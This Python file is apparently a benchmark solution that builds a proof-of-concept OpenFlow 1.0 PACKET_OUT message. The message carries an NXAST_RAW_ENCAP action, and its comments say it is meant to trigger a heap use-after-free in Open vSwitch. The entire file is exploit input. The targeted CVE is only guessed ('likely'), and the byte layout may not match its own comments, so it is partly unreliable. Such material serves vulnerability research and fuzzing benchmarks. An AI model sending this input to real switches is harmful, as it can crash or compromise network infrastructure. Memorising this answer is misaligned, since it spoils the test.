import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a Proof-of-Concept OpenFlow 1.0 message to trigger the Heap Use-After-Free
        # vulnerability in decode_NXAST_RAW_ENCAP.
        #
        # Target: OVS arvo:27851 (likely CVE-2022-32096)
        # Logic: A PACKET_OUT message containing a NXAST_RAW_ENCAP action.
        # The action contains properties that, when decoded, trigger a reallocation of the 
        # internal 'ofpbuf', causing the 'encap' pointer to become dangling (Use-After-Free).
        
        # OpenFlow 1.0 Header (8 bytes)
        # Version: 0x01 (OF 1.0)
        # Type: 0x0d (OFPT_PACKET_OUT)
        # Length: 72 bytes
        # XID: 0x00000000
        of_header = struct.pack('!BBHI', 0x01, 0x0d, 72, 0)
        
        # OFPT_PACKET_OUT Body (8 bytes)
        # Buffer ID: 0xffffffff (OFP_NO_BUFFER)
        # In Port: 0x0001
        # Actions Length: 56 bytes (72 - 16 headers)
        packet_out_header = struct.pack('!IHH', 0xffffffff, 1, 56)
        
        # Action: NXAST_RAW_ENCAP (16 bytes header + 40 bytes property)
        # Header Structure:
        #   Type: 0xffff (OFPAT_VENDOR)
        #   Length: 56
        #   Vendor: 0x00002320 (NX_VENDOR_ID)
        #   Subtype: 0x002e (NXAST_RAW_ENCAP)
        #   Pad: 6 bytes
        action_header = struct.pack('!HHIH6s', 0xffff, 56, 0x00002320, 0x002e, b'\x00'*6)
        
        # Property: NX_ENCAP_PROP_HEADER (Type 0)
        # Forces data into the buffer. 40 bytes total size is chosen to align with 
        # typical allocation boundaries and fit within the 72-byte limit.
        #   Type: 0
        #   Length: 40 (Header + Payload)
        #   Payload: 36 bytes of zeros
        prop_header = struct.pack('!HH', 0, 40)
        prop_payload = b'\x00' * 36
        
        # Assemble the PoC
        return of_header + packet_out_header + action_header + prop_header + prop_payload